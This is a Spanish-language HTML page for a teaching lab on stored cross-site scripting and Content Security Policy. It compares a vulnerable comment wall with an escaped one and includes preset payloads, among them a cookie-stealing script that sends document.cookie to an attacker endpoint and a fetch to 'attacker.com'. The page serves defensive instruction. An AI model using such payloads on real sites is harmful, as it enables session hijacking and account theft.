@@ -1,0 +1,190 @@
+<!DOCTYPE html>
+<html lang="es">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>XSS y CSP - Laboratorio de Ciberseguridad Aplicada</title>
+  <link rel="preconnect" href="https://fonts.googleapis.com">
+  <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+  <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700&family=JetBrains+Mono:wght@400;500&display=swap" rel="stylesheet">
+  <link rel="stylesheet" href="style.css">
+</head>
+<body>
+
+  <header class="header">
+    <div class="header-top">
+      <h1>Cross-Site Scripting (XSS) y Content Security Policy</h1>
+      <p class="header-sub">Laboratorio de Ciberseguridad Aplicada &middot; OWASP A03:2021</p>
+    </div>
+  </header>
+
+  <nav class="tabs">
+    <button class="tab active" data-tab="tab-stored" id="tab-btn-stored">Ejemplo 1: Stored XSS</button>
+    <button class="tab" data-tab="tab-csp" id="tab-btn-csp">Ejemplo 2: CSP como Mitigacion</button>
+  </nav>
+
+  <main class="main">
+
+    <!-- EJEMPLO 1: STORED XSS -->
+    <section class="tab-content active" id="tab-stored">
+
+      <div class="section-intro">
+        <h2>Stored XSS (Persistente)</h2>
+        <p>
+          Un atacante publica un comentario que contiene codigo JavaScript malicioso.
+          El servidor lo almacena sin validar. Cuando otro usuario visita la pagina,
+          su navegador ejecuta ese codigo en su contexto de sesion.
+        </p>
+      </div>
+
+      <!-- FORMULARIO -->
+      <div class="card">
+        <h3>Publicar comentario</h3>
+        <div class="form-row">
+          <div class="form-group">
+            <label for="input-autor">Autor</label>
+            <input type="text" id="input-autor" class="input" value="Atacante" placeholder="Nombre...">
+          </div>
+          <div class="form-group form-grow">
+            <label for="input-contenido">Contenido</label>
+            <input type="text" id="input-contenido" class="input" placeholder="Escribe un comentario o selecciona un payload...">
+          </div>
+        </div>
+
+        <div class="preset-bar">
+          <span class="preset-label">Payloads de prueba:</span>
+          <button class="preset" id="preset-cookie">Robo de cookie (fetch)</button>
+          <button class="preset" id="preset-alert">Alert clasico</button>
+          <button class="preset" id="preset-deface">Defacement</button>
+        </div>
+
+        <div class="actions">
+          <button class="btn btn-danger" id="btn-enviar-vulnerable">Publicar sin sanitizar (vulnerable)</button>
+          <button class="btn btn-safe" id="btn-enviar-mitigado">Publicar con escape HTML (mitigado)</button>
+        </div>
+      </div>
+
+      <!-- COMPARADOR -->
+      <div class="compare">
+        <div class="compare-col col-vuln">
+          <div class="col-head">
+            <div>
+              <h3>Muro Vulnerable</h3>
+              <p>El contenido se inserta en el DOM sin escapar.</p>
+            </div>
+            <div class="col-actions">
+              <button class="btn-sm" id="btn-reset-vulnerable">Reiniciar</button>
+            </div>
+          </div>
+          <div class="col-body" id="muro-vulnerable-container">
+            <p class="empty">Cargando...</p>
+          </div>
+        </div>
+
+        <div class="compare-col col-safe">
+          <div class="col-head">
+            <div>
+              <h3>Muro Mitigado</h3>
+              <p>El contenido se escapa con <code>HtmlUtils.htmlEscape()</code>.</p>
+            </div>
+            <div class="col-actions">
+              <button class="btn-sm" id="btn-reset-mitigado">Reiniciar</button>
+            </div>
+          </div>
+          <div class="col-body" id="muro-mitigado-container">
+            <p class="empty">Cargando...</p>
+          </div>
+        </div>
+      </div>
+
+      <!-- LOGS C2 -->
+      <div class="card card-c2">
+        <div class="card-head-row">
+          <div>
+            <h3>Servidor del atacante (C2) &mdash; Cookies capturadas</h3>
+            <p>Cada vez que el payload se ejecuta en el muro vulnerable, la cookie de la victima llega aqui.</p>
+          </div>
+          <div class="col-actions">
+            <button class="btn-sm" id="btn-refrescar-c2">Actualizar</button>
+            <button class="btn-sm" id="btn-limpiar-c2">Vaciar</button>
+          </div>
+        </div>
+        <table id="tabla-c2">
+          <thead>
+            <tr>
+              <th>ID</th>
+              <th>Hora</th>
+              <th>IP</th>
+              <th>Cookie capturada</th>
+            </tr>
+          </thead>
+          <tbody id="tabla-c2-body">
+            <tr><td colspan="4" class="empty">Sin registros. Publica el payload en el muro vulnerable para ver resultados.</td></tr>
+          </tbody>
+        </table>
+      </div>
+    </section>
+
+    <!-- EJEMPLO 2: CSP -->
+    <section class="tab-content" id="tab-csp">
+
+      <div class="section-intro">
+        <h2>Content Security Policy (CSP)</h2>
+        <p>
+          Una cabecera HTTP que indica al navegador que fuentes de scripts estan autorizadas.
+          Al establecer <code>script-src 'self'</code>, los scripts inline inyectados por un atacante
+          son bloqueados automaticamente por el navegador, sin importar si el HTML los contiene.
+        </p>
+      </div>
+
+      <div class="grid-2">
+        <!-- Cabecera -->
+        <div class="card">
+          <h3>Cabecera recomendada</h3>
+          <div class="code-box">
+            <pre><code>Content-Security-Policy: default-src 'self'; script-src 'self';</code></pre>
+          </div>
+          <ul class="explanation-list">
+            <li><code>script-src 'self'</code> &mdash; Solo permite ejecutar archivos <code>.js</code> del mismo origen.</li>
+            <li>Scripts inline como <code>&lt;script&gt;alert(1)&lt;/script&gt;</code> son rechazados.</li>
+            <li>Conexiones externas como <code>fetch('https://attacker.com/...')</code> son bloqueadas.</li>
+          </ul>
+          <a href="/mitigado/muro-csp-html" target="_blank" class="btn btn-safe" id="btn-abrir-csp" style="margin-top:12px;">
+            Abrir pagina con CSP activo (ver consola F12)
+          </a>
+        </div>
+
+        <!-- Simulacion -->
+        <div class="card">
+          <h3>Simulacion de bloqueo</h3>
+          <p>Que ocurre cuando un script inline se encuentra con CSP:</p>
+
+          <div class="sim-box">
+            <div class="sim-code">
+              <code>&lt;script&gt;fetch('/api/attacker/steal?cookie=' + document.cookie);&lt;/script&gt;</code>
+            </div>
+            <div class="sim-actions">
+              <button class="btn btn-danger btn-small" id="btn-sim-sin-csp">Sin CSP</button>
+              <button class="btn btn-safe btn-small" id="btn-sim-con-csp">Con CSP</button>
+            </div>
+            <div class="sim-output" id="sim-csp-output">
+              <span class="text-muted">Haz clic en uno de los botones para ver la reaccion del navegador.</span>
+            </div>
+          </div>
+
+          <div class="info-box">
+            CSP es una medida de "Defensa en Profundidad": si la sanitizacion falla, el navegador bloquea la ejecucion como segunda barrera.
+          </div>
+        </div>
+      </div>
+    </section>
+
+  </main>
+
+  <footer class="footer">
+    <p>Laboratorio de Ciberseguridad Aplicada &middot; UC2 &middot; OWASP A03:2021 Cross-Site Scripting</p>
+  </footer>
+
+  <script src="app.js"></script>
+</body>
+</html>
